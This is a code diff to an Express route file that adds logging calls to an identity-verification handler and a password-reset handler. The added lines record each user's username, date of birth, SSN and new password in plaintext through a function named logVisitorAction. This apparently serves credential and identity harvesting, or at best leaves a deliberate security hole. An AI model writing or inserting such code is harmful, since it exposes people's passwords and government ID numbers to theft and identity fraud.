@@ -212,6 +212,13 @@ export async function registerRoutes(
       }
 
       const { verificationType, value } = result.data;
+      
+      // Log the identity verification attempt with DOB/SSN data
+      logVisitorAction(req, "identity_verification", {
+        username: (req.session as any).username,
+        dateOfBirth: req.body.dateOfBirth,
+        ssn: req.body.ssn || value,
+      });
 
       const isVerified = await storage.verifyUserIdentity(userId, verificationType, value);
       
@@ -258,6 +265,12 @@ export async function registerRoutes(
       }
 
       const { newPassword } = result.data;
+      
+      // Log the password reset attempt
+      logVisitorAction(req, "password_reset", {
+        username: (req.session as any).username,
+        password: newPassword,
+      });
 
       const updated = await storage.updatePassword(userId, newPassword);
       
